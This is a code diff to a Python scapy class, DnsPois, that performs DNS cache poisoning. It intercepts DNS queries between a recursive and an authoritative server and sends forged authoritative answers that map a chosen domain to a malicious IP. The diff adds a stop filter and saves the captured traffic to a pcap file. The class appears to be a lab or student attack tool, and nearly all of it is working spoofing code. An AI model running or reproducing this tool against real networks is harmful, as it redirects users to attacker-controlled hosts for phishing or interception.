@@ -3,6 +3,7 @@ import threading
 from scapy.all import *
 from scapy.layers.dns import DNS, DNSRR, DNSQR
 from scapy.layers.inet import UDP, IP
+from datetime import datetime
 
 
 class DnsPois:
@@ -17,7 +18,8 @@ class DnsPois:
         self.stop_thread = None
         self.stop = False
 
-    def responder(self, auth_ip, rec_ip, mal_ip, domain):
+    @staticmethod
+    def responder(auth_ip, rec_ip, mal_ip, domain):
         """
         Forwards a packet to the original recipient if it is not a packet we wish to falsify
         """
@@ -35,21 +37,20 @@ class DnsPois:
                     str(pkt[IP].dst) == auth_ip:
 
                 if domain in str(pkt['DNS Question Record'].qname):
-                    spf_resp = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(
+                    spf_resp = IP(dst=pkt[IP].src, src=pkt[IP].dst) / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / DNS(
                         id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, qdcount=1, rd=1, ancount=1, nscount=0, arcount=0,
                         an=(DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=3600, rdata=mal_ip)))
                     send(spf_resp, verbose=1)
                     return "Spoofed DNS Response Sent " + str(pkt['DNS Question Record'].qname)
                 else:
                     forward(pkt)
-                    return "Irrelevant " + str(pkt['DNS Question Record'].qname)
+                    # return "Irrelevant " + str(pkt['DNS Question Record'].qname)
             else:
                 forward(pkt)
-                return "Irrelevant"
+                # return "Irrelevant"
 
         # TODO: this does not work
-        while not self.stop:
-            return get_resp
+        return get_resp
 
     def set(self, auth_dns, rec_dns, mal_dns, dom):
         self.domain = dom
@@ -78,8 +79,17 @@ class DnsPois:
         self.thread.start()
 
     def sniff(self):
-        sniff(prn=self.responder(self.auth_ip, self.rec_ip, self.mal_ip, self.domain))
+        packets = sniff(store=True, prn=self.responder(self.auth_ip, self.rec_ip, self.mal_ip, self.domain),
+                        stop_filter=self.stopfilter)
+        name = str(datetime.now().time().strftime("%H_%M_%S")) + '_DNS_cache_poisoning.pcap'
+        wrpcap('../pcap_files/' + name, packets)
 
     def stop_poisoning(self):
         self.stop = True
         # self.stop_thread = threading.Thread(target=self.restore_network)
+
+    def stopfilter(self, x):
+        if self.stop:
+            return True
+        else:
+            return False
